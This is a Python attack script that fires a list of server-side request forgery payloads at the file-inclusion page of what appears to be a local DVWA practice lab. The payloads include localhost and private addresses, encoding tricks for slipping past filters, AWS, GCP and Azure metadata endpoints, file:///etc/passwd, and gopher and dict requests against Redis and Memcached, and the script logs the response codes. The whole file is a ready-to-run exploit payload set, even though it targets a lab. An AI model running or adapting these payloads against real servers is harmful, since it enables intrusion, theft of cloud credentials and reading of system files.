import requests, time, random
TARGET = 'http://localhost:8080/vulnerabilities/fi/'
COOKIES = {'PHPSESSID': '278ab58002dbd5f0e20387685d3f6a8e', 'security': 'low'}
PAYLOADS = [
    # --- Basic: Localhost targeting ---
    'http://localhost', 'http://127.0.0.1', 'http://127.0.0.1:22',
    'http://localhost:8080', 'http://localhost:3306', 'http://127.1',
    'http://0.0.0.0', 'http://0.0.0.0:80', 'http://10.0.0.1',
    'http://192.168.1.1', 'http://172.16.0.1',
    
    # --- Medium: Alternate Encodings & IPv6 (Bypass WAF/Regex) ---
    'http://2130706433/',          # Decimal representation of 127.0.0.1
    'http://0177.0000.0000.0001/', # Octal representation of 127.0.0.1
    'http://0x7f000001/',          # Hex representation
    'http://[::1]:80/',            # IPv6 Localhost
    'http://[0:0:0:0:0:ffff:127.0.0.1]/', # IPv4-mapped IPv6 Address
    'http://127.0.0.1.nip.io',     # Wildcard DNS resolution back to localhost
    'http://localtest.me',         # Another wildcard DNS back to 127.0.0.1
    
    # --- Medium: Cloud Metadata Endpoints ---
    'http://169.254.169.254/latest/meta-data/',                 # AWS Default
    'http://169.254.169.254/latest/user-data/',                 # AWS User Data
    'http://metadata.google.internal/computeMetadata/v1/',      # GCP
    'http://169.254.169.254/metadata/instance?api-version=2017-08-01', # Azure
    
    # --- Advanced: Alternative OS Protocols via SSRF ---
    'file:///etc/hosts', 'file:///etc/passwd', 'file:///C:/Windows/win.ini',
    'gopher://127.0.0.1:6379/_INFO',             # Redis Exploitation via Gopher
    'dict://127.0.0.1:11211/info',               # Memcached via Dict
    'ftp://127.0.0.1:21', 'ftp://user:pass@127.0.0.1:21',
    'telnet://127.0.0.1:23', 'ldap://127.0.0.1:389'
]
print('--- A10: SSRF (Server-Side Request Forgery) ---')
for p in PAYLOADS:
    res = requests.get(TARGET, params={'page': p}, cookies=COOKIES)
    print(f'[*] SSRF Payload: {p} -> Status: {res.status_code}')
    time.sleep(random.uniform(0.5, 1.5))
